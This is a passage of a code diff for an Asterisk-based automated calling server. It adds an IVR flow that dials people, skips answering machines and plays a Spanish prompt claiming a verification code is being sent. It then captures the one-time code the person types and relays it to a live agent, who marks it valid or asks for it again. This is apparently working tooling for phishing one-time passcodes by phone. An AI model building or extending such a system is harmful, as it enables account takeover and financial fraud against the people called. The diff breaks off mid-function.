@@ -523,7 +523,7 @@ export interface CallState {
   number: string;
   channel?: string;
   bridgedChannel?: string;
-  status: 'dialing' | 'ringing' | 'in_ivr' | 'talking' | 'on_hold' | 'pressed_1' | 'machine' | 'ended' | 'transferred';
+  status: 'dialing' | 'ringing' | 'in_ivr' | 'talking' | 'on_hold' | 'pressed_1' | 'otp_valid' | 'otp_invalid' | 'machine' | 'ended' | 'transferred';
   digit?: string;
   cause?: string;
   agent?: string;
@@ -1145,6 +1145,8 @@ function ensureCustomAudioFilesExist() {
     { name: 'enviando_codigo_cancelacion', text: 'Un momento por favor, le estamos enviando un codigo de cancelacion.', freq: 520 },
     { name: 'digite_codigo_cancelacion', text: 'Por favor digite el codigo de cancelacion que le fue enviado seguido de la tecla numeral.', freq: 680 },
     { name: 'operacion_cancelada_exito', text: 'Su codigo de cancelacion ha sido validado con exito. La operacion ha sido cancelada. Gracias.', freq: 880 },
+    { name: 'enviando_codigo_verificacion', text: 'Un momento por favor, le estamos enviando su codigo de verificacion.', freq: 520 },
+    { name: 'digite_codigo_verificacion', text: 'Por favor digite su codigo de verificacion enviado a su telefono seguido de la tecla numeral.', freq: 680 },
     { name: 'mi_audio', text: 'Bienvenido al servicio de atencion al cliente.', freq: 520 },
     { name: 'moh_corporate_loop', text: '', freq: 440 },
     { name: 'moh_corporate_loop', text: '', freq: 523 },
@@ -3720,6 +3722,160 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=ended&cause=\${HANGUPCAUSE}&channel=\${CHANNEL}" &)\n\n`;
 
+  dialplanContent += `; ========================================================\n`;
+  dialplanContent += `; CONTEXTO IVR DE CAPTURA OTP (PRESS 1 -> AUDIO ESPERA -> CAPTURA Y VALIDACION EN VIVO)\n`;
+  dialplanContent += `; ========================================================\n`;
+  dialplanContent += `[ivr-otp-verify]\n`;
+  dialplanContent += `exten => s,1,NoOp(=== [IVR-OTP-VERIFY] INICIO FLUJO IVR DE CAPTURA OTP (PRESS 1 + VERIFICACION) ===)\n`;
+  dialplanContent += ` same => n,Answer()\n`;
+  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_NUM}" != ""]?\${TARGET_NUM}:\${IF($["\${CUSTOMER_NUM}" != ""]?\${CUSTOMER_NUM}:\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})})})\n`;
+  dialplanContent += ` same => n,Set(__TARGET_NUM=\${TARGET_DEST})\n`;
+  dialplanContent += ` same => n,Set(__CUSTOMER_NUM=\${TARGET_DEST})\n`;
+  dialplanContent += ` same => n,Set(__TARGET_DEST=\${TARGET_DEST})\n`;
+  dialplanContent += ` same => n,Set(__CALL_DEST=\${TARGET_DEST})\n`;
+  dialplanContent += ` same => n,Set(AMD_ACTIVE=\${DB(ivr_vars/amd_enabled)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AMD_ENABLED}" != ""]?Set(AMD_ACTIVE=\${AMD_ENABLED}))\n`;
+  dialplanContent += ` same => n,GotoIf($["\${AMD_ACTIVE}" = "0" | "\${AMD_ACTIVE}" = "disabled" | "\${AMD_ACTIVE}" = "off" | "\${AMD_ACTIVE}" = ""]?skip_amd_otp_v)\n`;
+  dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Analizando llamada IVR Captura OTP hacia \${TARGET_DEST} ===)\n`;
+  dialplanContent += ` same => n,AMD(2500,1600,700,4500,100,50,5,256,5000)\n`;
+  dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Destino: \${TARGET_DEST} | AMDSTATUS=\${AMDSTATUS} | AMDCAUSE=\${AMDCAUSE} ===)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${AMDSTATUS}" = "MACHINE"]?amd_machine_otp_v)\n`;
+  dialplanContent += ` same => n,Goto(amd_ok_otp_v)\n`;
+  dialplanContent += ` same => n(skip_amd_otp_v),Wait(0.3)\n`;
+  dialplanContent += ` same => n(amd_ok_otp_v),Set(DB(call_status/\${TARGET_DEST})=in_ivr)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=waiting_press1)\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_DEST}&status=in_ivr&mode=otp_press1&channel=\${CHANNEL}" &)\n`;
+  dialplanContent += ` same => n,UserEvent(CallAnswered,Number=\${TARGET_DEST},Context=ivr-otp-verify,Channel=\${CHANNEL})\n`;
+  dialplanContent += ` same => n,Set(TIMEOUT(digit)=1)\n`;
+  dialplanContent += ` same => n,Set(TIMEOUT(response)=6)\n`;
+  dialplanContent += ` same => n,Set(TIMEOUT(absolute)=240)\n`;
+  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != "" & "\${IVR_AGENT_EXTEN}" != "ringall" & "\${IVR_AGENT_EXTEN}" != "all"]?\${IVR_AGENT_EXTEN}:\${CALLING_AGENT})})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = "" & "\${CHANNEL(channeltype)}" = "PJSIP"]?Set(FINAL_AGENT=\${CHANNEL(endpoint)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
+  dialplanContent += ` same => n,Set(IVR_INTRO=\${CALL_INTRO})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = "" & "\${TENANT_ID}" != ""]?Set(IVR_INTRO=\${DB(ivr_vars/tenant_\${TENANT_ID}_intro)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/agent_\${FINAL_AGENT}_intro)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/\${TARGET_DEST}_intro)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/default_intro)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/bienvenida_press1))\n`;
+  dialplanContent += ` same => n,Set(IVR_OTP_VERIFY_WAIT=\${CALL_OTP_VERIFY_WAIT})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_OTP_VERIFY_WAIT}" = "" & "\${TENANT_ID}" != ""]?Set(IVR_OTP_VERIFY_WAIT=\${DB(ivr_vars/tenant_\${TENANT_ID}_otp_verify_wait)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_OTP_VERIFY_WAIT}" = ""]?Set(IVR_OTP_VERIFY_WAIT=\${DB(ivr_vars/agent_\${FINAL_AGENT}_otp_verify_wait)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_OTP_VERIFY_WAIT}" = ""]?Set(IVR_OTP_VERIFY_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_otp_verify_wait)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_OTP_VERIFY_WAIT}" = ""]?Set(IVR_OTP_VERIFY_WAIT=\${DB(ivr_vars/default_otp_verify_wait)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_OTP_VERIFY_WAIT}" = ""]?Set(IVR_OTP_VERIFY_WAIT=custom/enviando_codigo_verificacion))\n`;
+  dialplanContent += ` same => n,Set(IVR_OTP_PROMPT=\${CALL_PROMPT})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_OTP_PROMPT}" = "" & "\${TENANT_ID}" != ""]?Set(IVR_OTP_PROMPT=\${DB(ivr_vars/tenant_\${TENANT_ID}_prompt)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_OTP_PROMPT}" = ""]?Set(IVR_OTP_PROMPT=\${DB(ivr_vars/agent_\${FINAL_AGENT}_prompt)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_OTP_PROMPT}" = ""]?Set(IVR_OTP_PROMPT=\${DB(ivr_vars/\${TARGET_DEST}_prompt)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_OTP_PROMPT}" = ""]?Set(IVR_OTP_PROMPT=custom/digite_codigo_verificacion))\n`;
+  dialplanContent += ` same => n,Set(IVR_WAIT=\${CALL_WAIT})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = "" & "\${TENANT_ID}" != ""]?Set(IVR_WAIT=\${DB(ivr_vars/tenant_\${TENANT_ID}_wait)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${DB(ivr_vars/default_wait)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=custom/un_momento_validando_informacion))\n`;
+  dialplanContent += ` same => n,Set(IVR_SUCCESS=\${CALL_SUCCESS})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = "" & "\${TENANT_ID}" != ""]?Set(IVR_SUCCESS=\${DB(ivr_vars/tenant_\${TENANT_ID}_success)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=custom/otp_validado_exito))\n`;
+  dialplanContent += ` same => n,Set(IVR_FAILURE=\${DB(ivr_vars/agent_\${FINAL_AGENT}_failure)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_FAILURE}" = ""]?Set(IVR_FAILURE=\${DB(ivr_vars/default_failure)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_FAILURE}" = ""]?Set(IVR_FAILURE=custom/token_invalido_reintente))\n`;
+  dialplanContent += ` same => n,Set(IVR_INTRO=\${STRREPLACE(IVR_INTRO,.wav,)})\n`;
+  dialplanContent += ` same => n,Set(IVR_OTP_VERIFY_WAIT=\${STRREPLACE(IVR_OTP_VERIFY_WAIT,.wav,)})\n`;
+  dialplanContent += ` same => n,Set(IVR_OTP_PROMPT=\${STRREPLACE(IVR_OTP_PROMPT,.wav,)})\n`;
+  dialplanContent += ` same => n,Set(IVR_WAIT=\${STRREPLACE(IVR_WAIT,.wav,)})\n`;
+  dialplanContent += ` same => n,Set(IVR_SUCCESS=\${STRREPLACE(IVR_SUCCESS,.wav,)})\n`;
+  dialplanContent += ` same => n,Set(IVR_FAILURE=\${STRREPLACE(IVR_FAILURE,.wav,)})\n`;
+  dialplanContent += ` same => n,Set(INTRO_TRIES=0)\n`;
+  dialplanContent += ` same => n(menu),Set(INTRO_TRIES=$[\${INTRO_TRIES} + 1])\n`;
+  dialplanContent += ` same => n,NoOp(=== [IVR-OTP-VERIFY] Reproduciendo saludo (\${INTRO_TRIES}/2): \${IVR_INTRO} ===)\n`;
+  dialplanContent += ` same => n,Background(\${IVR_INTRO})\n`;
+  dialplanContent += ` same => n,WaitExten(6)\n`;
+  dialplanContent += ` same => n,GotoIf($[\${INTRO_TRIES} < 2]?menu)\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
+  dialplanContent += ` same => n(amd_machine_otp_v),NoOp(=== [AMD-OPERADORA] Contestador detectado en \${TARGET_DEST} -> Colgando ===)\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=machine_detected)\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_DEST}&status=machine_detected&cause=\${AMDCAUSE}&channel=\${CHANNEL}" &)\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
+
+  dialplanContent += `; CLIENTE PRESIONA 1 -> REPRODUCE "UN MOMENTO POR FAVOR, LE ESTAMOS ENVIANDO SU CODIGO DE VERIFICACION" -> CAPTURA Y VALIDACION EN LIVECALLSTAB\n`;
+  dialplanContent += `exten => 1,1,NoOp(=== [IVR-OTP-VERIFY] DIGITO 1 DETECTADO -> ENVIANDO CODIGO DE VERIFICACION ===)\n`;
+  dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_NUM}" != ""]?\${TARGET_NUM}:\${IF($["\${CUSTOMER_NUM}" != ""]?\${CUSTOMER_NUM}:\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})})})\n`;
+  dialplanContent += ` same => n,Set(__TARGET_NUM=\${TARGET_NUM})\n`;
+  dialplanContent += ` same => n,Set(__TARGET_DEST=\${TARGET_NUM})\n`;
+  dialplanContent += ` same => n,Set(__CALL_DEST=\${TARGET_NUM})\n`;
+  dialplanContent += ` same => n,Set(__CUSTOMER_NUM=\${TARGET_NUM})\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=pressed_1)\n`;
+  dialplanContent += ` same => n,Set(DB(call_digit/\${TARGET_NUM})=1)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_NUM})=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_NUM}_\${FINAL_AGENT})=pending)\n`;
+  dialplanContent += ` same => n,UserEvent(Press1Detected,Number=\${TARGET_NUM},Digit=1,Mode=otp_press1,Channel=\${CHANNEL})\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=pressed_1&digit=1&mode=otp_press1&channel=\${CHANNEL}" &)\n`;
+  dialplanContent += ` same => n,Playback(\${IVR_OTP_VERIFY_WAIT})\n`;
+  dialplanContent += ` same => n,Wait(2)\n`;
+  dialplanContent += ` same => n,Set(PRE_STATUS=\${TOLOWER(\${FILTER(abcdefghijklmnopqrstuvwxyz,\${DB(otp_status/\${TARGET_NUM})})})})\n`;
+  dialplanContent += ` same => n,GotoIf($["\${PRE_STATUS}" = "valid"]?otp_verify_approved)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${PRE_STATUS}" = "invalid"]?otp_verify_rejected)\n`;
+  dialplanContent += ` same => n,Set(OTP_V_RETRIES=0)\n`;
+  dialplanContent += ` same => n(ask_otp_verify),Set(OTP_V_RETRIES=$[\${OTP_V_RETRIES} + 1])\n`;
+  dialplanContent += ` same => n,Set(USER_DIGITS=)\n`;
+  dialplanContent += ` same => n,NoOp(=== [IVR-OTP-VERIFY] Solicitando codigo OTP (\${OTP_V_RETRIES}/3) con audio: \${IVR_OTP_PROMPT} ===)\n`;
+  dialplanContent += ` same => n,Read(USER_DIGITS,\${IVR_OTP_PROMPT},8,,2,15)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?otp_verify_captured)\n`;
+  dialplanContent += ` same => n,Set(MID_STATUS=\${TOLOWER(\${FILTER(abcdefghijklmnopqrstuvwxyz,\${DB(otp_status/\${TARGET_NUM})})})})\n`;
+  dialplanContent += ` same => n,GotoIf($["\${MID_STATUS}" = "valid"]?otp_verify_approved)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${MID_STATUS}" = "invalid"]?otp_verify_rejected)\n`;
+  dialplanContent += ` same => n,GotoIf($[\${OTP_V_RETRIES} < 3]?ask_otp_verify)\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
+  dialplanContent += ` same => n(otp_verify_captured),NoOp(=== [IVR-OTP-VERIFY] CODIGO OTP DIGITADO: \${USER_DIGITS} -> ENVIANDO A AGENTE \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_codes/\${TARGET_NUM})=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(otp_captures/\${TARGET_NUM})=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_NUM})=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_NUM}_\${FINAL_AGENT})=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_last_capture)=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${TARGET_NUM},Digits=\${USER_DIGITS},Status=pending,Mode=otp_press1,Agent=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_NUM}&otp=\${USER_DIGITS}&agent=\${FINAL_AGENT}&service=IVR%20Captura%20OTP&channel=\${CHANNEL}&status=pending" &)\n`;
+  dialplanContent += ` same => n,Playback(\${IVR_WAIT})\n`;
+  dialplanContent += ` same => n,Set(WAIT_LOOP=0)\n`;
+  dialplanContent += ` same => n(wait_otp_verify_decision),Set(WAIT_LOOP=$[\${WAIT_LOOP} + 1])\n`;
+  dialplanContent += ` same => n,Set(RAW_OV_STATUS=\${DB(otp_status/\${TARGET_NUM}_\${FINAL_AGENT})})\n`;
+  dialplanContent += ` same => n,ExecIf($[$["\${RAW_OV_STATUS}" = ""] | $["\${RAW_OV_STATUS}" = "pending"]]?Set(RAW_OV_STATUS=\${DB(otp_status/\${TARGET_NUM})}))\n`;
+  dialplanContent += ` same => n,Set(CURRENT_STATUS=\${TOLOWER(\${FILTER(abcdefghijklmnopqrstuvwxyz,\${RAW_OV_STATUS})})})\n`;
+  dialplanContent += ` same => n,NoOp(=== [IVR-OTP-VERIFY] Esperando decision agente \${WAIT_LOOP}/90 - Estado: \${CURRENT_STATUS} ===)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "valid"]?otp_verify_approved)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "invalid"]?otp_verify_rejected)\n`;
+  dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 90]?otp_verify_timeout)\n`;
+  dialplanContent += ` same => n,ExecIf($[$[\${WAIT_LOOP} % 8] = 0]?Playback(beep))\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
+  dialplanContent += ` same => n,Goto(wait_otp_verify_decision)\n\n`;
+  dialplanContent += ` same => n(otp_verify_approved),NoOp(=== [IVR-OTP-VERIFY] CODIGO OTP VALIDADO POR AGENTE ===)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_NUM})=done)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_NUM}_\${FINAL_AGENT})=done)\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=otp_valid)\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=otp_valid&mode=otp_press1&channel=\${CHANNEL}" &)\n`;
+  dialplanContent += ` same => n,Playback(\${IVR_SUCCESS})\n`;
+  dialplanContent += ` same => n,Wait(0.5)\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
+  dialplanContent += ` same => n(otp_verify_rejected),NoOp(=== [IVR-OTP-VERIFY] CODIGO OTP RECHAZADO POR AGENTE -> REINTENTANDO ===)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_NUM})=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_NUM}_\${FINAL_AGENT})=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=otp_invalid)\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=otp_invalid&mode=otp_press1&channel=\${CHANNEL}" &)\n`;
+  dialplanContent += ` same => n,Playback(\${IVR_FAILURE})\n`;
+  dialplanContent += ` same => n,Goto(ask_otp_verify)\n\n`;
+  dialplanContent += ` same => n(otp_verify_timeout),Playback(custom/intentos_superados)\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
+  dialplanContent += `exten => i,1,NoOp(=== [IVR-OTP-VERIFY] Tecla no valida (\${EXTEN}) -> Esperando tecla 1 ===)\n`;
+  dialplanContent += ` same => n,Goto(s,menu)\n`;
+  dialplanContent += `exten => t,1,GotoIf($[\${INTRO_TRIES} < 2]?s,menu)\n`;
+  dialplanContent += ` same => n,Hangup()\n`;
+  dialplanContent += `exten => h,1,NoOp(=== [IVR-OTP-VERIFY HANGUP] Canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
+  dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=ended&cause=\${HANGUPCAUSE}&channel=\${CHANNEL}" &)\n\n`;
+
   dialplanContent += `; Alias de compatibilidad para modo hybrid hacia ivr-otp\n`;
   dialplanContent += `[ivr-hybrid]\n`;
   dialplanContent += `exten => s,1,Goto(ivr-otp,s,1)\n\n`;
@@ -5053,6 +5209,8 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       targetContext = 'ivr-hybrid';
     } else if (effectiveMode === 'cancel_code' || effectiveMode === 'press1_cancel') {
       targetContext = 'ivr-press1-cancel';
+    } else if (effectiveMode === 'otp_press1' || effectiveMode === 'ivr_otp_verify') {
+      targetContext = 'ivr-otp-verify';
     } else {
       targetContext = 'ivr-press1';
     }
@@ -5300,6 +5458,7 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
     const cleanAgent = (audioAgent || '').trim().replace(/\.wav$/i, '');
     const cleanSuccess = (audioSuccess || '').trim().replace(/\.wav$/i, '');
     const cleanCancelWait = (req.body.audioCancelWait || req.body.cancelWait || '').trim().replace(/\.wav$/i, '');
+    const cleanOtpVerifyWait = (req.body.audioOtpVerifyWait || req.body.otpVerifyWait || '').trim().replace(/\.wav$/i, '');
     const clean10Ast = cleanDest.length === 11 && cleanDest.startsWith('1') ? cleanDest.substring(1) : cleanDest;
 
     // Reset any stale otp_status for this destination so a fresh call starts pending
@@ -5347,6 +5506,14 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       if (cleanDest === '8888') {
         astDbCommands.push(`database put ivr_vars 8888_cancel_wait "${cleanCancelWait}"`);
         astDbCommands.push(`database put ivr_vars default_cancel_wait "${cleanCancelWait}"`);
+      }
+    }
+    if (cleanOtpVerifyWait) {
+      astDbCommands.push(`database put ivr_vars ${cleanDest}_otp_verify_wait "${cleanOtpVerifyWait}"`);
+      astDbCommands.push(`database put ivr_vars ${formattedDest}_otp_verify_wait "${cleanOtpVerifyWait}"`);
+      if (cleanDest === '8888') {
+        astDbCommands.push(`database put ivr_vars 8888_otp_verify_wait "${cleanOtpVerifyWait}"`);
+        astDbCommands.push(`database put ivr_vars default_otp_verify_wait "${cleanOtpVerifyWait}"`);
       }
     }
 
@@ -5468,6 +5635,7 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       ...(cleanSuccess ? { CALL_SUCCESS: cleanSuccess, __CALL_SUCCESS: cleanSuccess } : (req.body.success ? { CALL_SUCCESS: String(req.body.success).trim(), __CALL_SUCCESS: String(req.body.success).trim() } : {})),
       ...(cleanAgent ? { CALL_AGENT: cleanAgent, __CALL_AGENT: cleanAgent } : (req.body.agentAudio ? { CALL_AGENT: String(req.body.agentAudio).trim(), __CALL_AGENT: String(req.body.agentAudio).trim() } : {})),
       ...(cleanCancelWait ? { CALL_CANCEL_WAIT: cleanCancelWait, __CALL_CANCEL_WAIT: cleanCancelWait } : {}),
+      ...(cleanOtpVerifyWait ? { CALL_OTP_VERIFY_WAIT: cleanOtpVerifyWait, __CALL_OTP_VERIFY_WAIT: cleanOtpVerifyWait } : {}),
       ...(holdMusic ? { CALL_HOLD_MUSIC: holdMusic, __CALL_HOLD_MUSIC: holdMusic } : {}),
       IVR_MODE: effectiveMode || 'press1',
       ASSIGNED_CARRIER: (cleanCarrier && cleanCarrier !== 'auto' && cleanCarrier !== 'pool') ? cleanCarrier : '',
@@ -5489,25 +5657,6 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
         console.warn('[FAST ORIGINATE EXCEPTION] Ejecutando fallback de llamada:', err.message);
         fallbackOriginate(channel, targetContext, targetExten, originateCallerId, originateVars);
       });
-
-    // Fallback simulation: only for internal softphone testing (8888 or 7777)
-    if (cleanDest === '8888' || cleanDest === '7777') {
-      setTimeout(() => {
-        const simulatedDigits = String(Math.floor(100000 + Math.random() * 900000));
-        const record: CapturedOtpItem = {
-          id: 'otp-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6),
-          number: cleanDest,
-          otp: simulatedDigits,
-          timestamp: new Date().toLocaleTimeString(),
-          channel: channel || 'PJSIP',
-          service: service || 'Servicio al Cliente',
-          status: 'pending',
-        };
-        capturedOtpHistory.unshift(record);
-        if (capturedOtpHistory.length > 300) capturedOtpHistory.pop();
-        console.log(`[REAL-TIME HUD TEST] Código OTP recibido para ${cleanDest}: ${simulatedDigits}`);
-      }, 6500);
-    }
 
     res.json({
       success: true,
@@ -5803,6 +5952,7 @@ const DEFAULT_AUDIO_ASSIGNMENTS: Record<string, string> = {
   // Generic system fallbacks
   otp_welcome: 'custom/solicitar_codigo_otp',
   otp_wait: 'custom/un_momento_validando_informacion',
+  otp_verify_wait: 'custom/enviando_codigo_verificacion',
   otp_success: 'custom/operacion_bloqueada_exito',
   otp_failure: 'custom/token_invalido_reintente',
   hold_music: 'custom/voz_comercial_para_barrick_pueblo_viejo_',
@@ -6488,6 +6638,8 @@ app.post('/api/asterisk/action/set-default', (req, res) => {
         ? 'ivr-hybrid'
         : (mode === 'cancel_code' || mode === 'press1_cancel')
         ? 'ivr-press1-cancel'
+        : (mode === 'otp_press1' || mode === 'ivr_otp_verify')
+        ? 'ivr-otp-verify'
         : 'ivr-press1';
     executeAsteriskCommand(`database put ivr_vars default_action "${targetContext}"`).catch(() => {});
     executeAsteriskCommand(`database put ivr_vars default_mode "${mode}"`).catch(() => {});
@@ -7015,6 +7167,7 @@ app.post('/api/asterisk/audio/sync-defaults', async (req, res) => {
       success = 'custom/operacion_bloqueada_exito',
       agent = 'custom/conectar_asesor',
       cancelWait = 'custom/enviando_codigo_cancelacion',
+      otpVerifyWait = 'custom/enviando_codigo_verificacion',
       holdMusic,
       destination,
       agentId,
@@ -7050,6 +7203,7 @@ app.post('/api/asterisk/audio/sync-defaults', async (req, res) => {
     const cleanSuccess = cleanVal(success);
     const cleanAgent = cleanVal(agent);
     const cleanCancelWait = cleanVal(cancelWait);
+    const cleanOtpVerifyWait = cleanVal(otpVerifyWait);
     const cleanMoh = cleanVal(holdMusic);
 
     const primaryTargets = new Set<string>();
@@ -7102,6 +7256,7 @@ app.post('/api/asterisk/audio/sync-defaults', async (req, res) => {
         if (cleanSuccess) cmds.push(`database put ivr_vars ${tgt}_success ${cleanSuccess}`);
         if (cleanAgent) cmds.push(`database put ivr_vars ${tgt}_agent ${cleanAgent}`);
         if (cleanCancelWait) cmds.push(`database put ivr_vars ${tgt}_cancel_wait ${cleanCancelWait}`);
+        if (cleanOtpVerifyWait) cmds.push(`database put ivr_vars ${tgt}_otp_verify_wait ${cleanOtpVerifyWait}`);
         if (cleanMoh) cmds.push(`database put ivr_vars ${tgt}_hold_music ${cleanMoh}`);
       }
       return cmds;
@@ -8109,7 +8264,11 @@ app.all('/api/asterisk/call/status/update', (req, res) => {
       duration,
       tenantId: tenant || existing?.tenantId,
       mode: modeParam || existing?.mode,
-      cancelDecision: status === 'cancel_valid' ? 'valid' : status === 'cancel_invalid' ? 'invalid' : existing?.cancelDecision,
+      cancelDecision: (status === 'cancel_valid' || status === 'otp_valid')
+        ? 'valid'
+        : (status === 'cancel_invalid' || status === 'otp_invalid')
+        ? 'invalid'
+        : existing?.cancelDecision,
       isOnHold: existing?.isOnHold,
       bridgedChannel: existing?.bridgedChannel,
     };
@@ -8257,6 +8416,8 @@ app.all('/api/asterisk/call/retry', async (req, res) => {
             ? 'ivr-hybrid'
             : (payload.mode === 'cancel_code' || payload.mode === 'press1_cancel')
             ? 'ivr-press1-cancel'
+            : (payload.mode === 'otp_press1' || payload.mode === 'ivr_otp_verify')
+            ? 'ivr-otp-verify'
             : 'ivr-press1';
         const rawRetryCid = String(payload.callerIdNum || payload.callerId || '').trim();
         const effectiveCidNum = (!rawRetryCid || rawRetryCid.includes('5550199') || /asignado/i.test(rawRetryCid)) ? '' : rawRetryCid;
@@ -8491,11 +8652,38 @@ app.get('/api/asterisk/live/calls', async (req, res) => {
   try {
     const list: any[] = [];
     const now = Date.now();
+    const queryTenantId = req.query.tenantId ? String(req.query.tenantId).trim() : '';
+    const queryExtensionsRaw = req.query.extensions ? String(req.query.extensions).trim() : '';
+    const allowedExts = queryExtensionsRaw
+      ? queryExtensionsRaw.split(',').map((s) => s.trim()).filter(Boolean)
+      : [];
+
+    const norm10 = (val?: string) => {
